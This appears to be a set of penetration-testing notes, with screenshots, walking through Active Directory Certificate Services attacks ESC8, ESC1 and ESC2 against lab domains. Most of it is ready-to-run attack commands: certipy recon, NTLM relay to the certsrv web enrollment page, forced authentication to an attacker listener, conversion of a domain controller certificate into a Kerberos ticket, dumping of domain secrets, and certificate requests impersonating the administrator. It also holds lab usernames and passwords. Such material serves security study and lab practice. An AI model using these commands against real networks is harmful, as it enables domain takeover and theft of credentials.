----------------

### AD_CS ESC8

----------------

- ESC8 (exposed certsrv)-:
- Recon with `certipy-ad` -:

```bash
certipy-ad find -u "jtrueblood" -p "blood_brothers" -dc-ip "10.1.57.249" -vulnerable -enabled
```

<img width="1113" height="540" alt="image" src="https://github.com/user-attachments/assets/1cfff4e5-503f-4a2f-9b10-dbe41b7f9b57" />

- Grepping for the vulnerable ADCS's ESC which is ESC8 (web enrollment version exposed via http)-:

```bash
cat *.txt | grep "ESC"

```
<img width="829" height="108" alt="image" src="https://github.com/user-attachments/assets/c660c81f-927a-404a-80cb-24c66170b969" />

- ESC8 is a vulnerability related to ADCS Web Enrollment. ADCS Web Enrollment is a feature that deploys a web server, enabling clients to request a certificate template. This web server supports NTLM authentication, making it susceptible to relay attacks. For this attack to succeed, you must know a valid template name to enroll in. Fortunately, ADCS comes with several default enabled templates that can be used, including ‘User,’ ‘Machine,’ and ‘DomainController.’ These templates are fairly self-explanatory: ‘User’ is for Domain Users, ‘Machine’ is for Domain Computers, and ‘DomainController’ is for Enterprise Domain Controllers.
- Exploiting with `impacket-ntlmrelayx`-:

```bash
impacket-ntlmrelayx -t http://10.1.57.249/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

<img width="1318" height="696" alt="image" src="https://github.com/user-attachments/assets/3a9d7f78-a46c-4219-90cd-6794e0843feb" />

- Later, you have to use the printer bug to coerce authentication

```bash
nxc smb 10.1.57.249 -M coerce_plus -o LISTENER="10.200.88.20"
```

<img width="1561" height="142" alt="image" src="https://github.com/user-attachments/assets/86960c6f-4da7-4d3a-9151-aeca6cf866b3" />

- Certificate for machine `DC01$` received

<img width="1057" height="361" alt="image" src="https://github.com/user-attachments/assets/93cd80a1-813b-44ec-9329-d52be7ae4549" />

- Convert to ticket grant ticket with `pkinttools`-:

```bash
python3 gettgtpkinit.py -cert-pfx DC01.shadow.gate.pfx -dc-ip 10.1.57.249 shadow.gate/dc01$ admin.ccache
```
<img width="1124" height="193" alt="image" src="https://github.com/user-attachments/assets/c3f8b78f-3592-4c11-b639-7b4882f69390" />

- Dump secrets with `impacket-secrets-dump`

```bash
impacket-secretsdump -k -no-pass dc01.shadow.gate
```

<img width="1031" height="523" alt="image" src="https://github.com/user-attachments/assets/fc622cf9-79cd-48bf-827e-94e2c0ced536" />

------------

### ADCS ESC1

-------------

- This issue occurs in Certificate Template Management (certtmpl.msc) under the “Request Handling” settings in the template. The mistake is that the “Supply in the request” option allows users to specify any Subject Alternative Name (SAN), enabling attackers to request certificates for Administrator, Domain Admins, or service accounts.The other issue is also making it accessible to nay domain users.
- Custom ESC1-:

<img width="1170" height="959" alt="image" src="https://github.com/user-attachments/assets/29b84e91-0e2e-4d0e-91a9-b02148277ce4" />

- Exploitation with certipy-ad, request certificate as administrator-:

```bash
certipy-ad req -u 'dev@papa.local' -p 'password' -dc-ip 192.168.130.136 -ca LAB-ROOT-CA -target 'DC01.papa.local' -template 'Custom_ESC1' -upn 'administrator@papa.local'
```
<img width="1083" height="335" alt="image" src="https://github.com/user-attachments/assets/8c555bb5-1b25-4145-af0b-ad2fa6c62dc3" />

- Authenticating as Administrator to get ntlm hash or ticket-:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.130.136
```

<img width="1160" height="344" alt="image" src="https://github.com/user-attachments/assets/9920db31-bcf6-4a8a-8f27-f6bf0c453b44" />

- Evil-winrm-:

<img width="1302" height="326" alt="image" src="https://github.com/user-attachments/assets/0c6682ab-284d-46eb-9cad-15965709e13d" />

------------------

### ADCS 2

------------------

- ESC2 (Escalation Path 2) is a vulnerability in Active Directory Certificate Services (AD CS) where a certificate template allows low-privileged users to enroll, and the template includes dangerous Extended Key Usages (EKUs) like:

 - Client Authentication (1.3.6.1.5.5.7.3.2)
 - Smart Card Logon (1.3.6.1.4.1.311.20.2.2)
 - Any Purpose (2.5.29.37.0)
- These EKUs enable the attacker to request a certificate and authenticate as a different user via Kerberos (PKINIT), bypassing passwords entirely. 

- Run the `certipy-ad find`
- Grep for "ESC2" and spot the necessary `ANY PURPOSE` detail and also `domain users` for enrollment rights-:

<img width="1038" height="965" alt="image" src="https://github.com/user-attachments/assets/d2885e45-0bd4-43d3-933a-ed71351243a8" />

- Request certificate for your own user `dev`-:

```bash
certipy-ad req -u 'dev@papa.local' -p 'password' -dc-ip 192.168.130.136  -ca LAB-ROOT-CA -target 'DC01.papa.local' -template 'ESC2'
```
<img width="1408" height="301" alt="image" src="https://github.com/user-attachments/assets/8dbb1c16-5308-4915-a693-dcf2fd06174a" />

- Request for administrator next-:

```bash
certipy-ad req -u 'dev@papa.local' -p 'password' -dc-ip 192.168.130.136  -ca LAB-ROOT-CA -target 'DC01.papa.local' -template 'User' -on-behalf-of administrator -pfx dev.pfx
```

<img width="1660" height="322" alt="image" src="https://github.com/user-attachments/assets/7abe2697-2174-4f0e-a455-6681a7c4cb16" />

- Authenticate again-:

```bash
certipy-ad auth -pfx administrator --dc-ip <ip>
```
<img width="1158" height="392" alt="image" src="https://github.com/user-attachments/assets/b2fd19d4-a13b-48b4-b902-aff34201f1fb" />

-----------------------







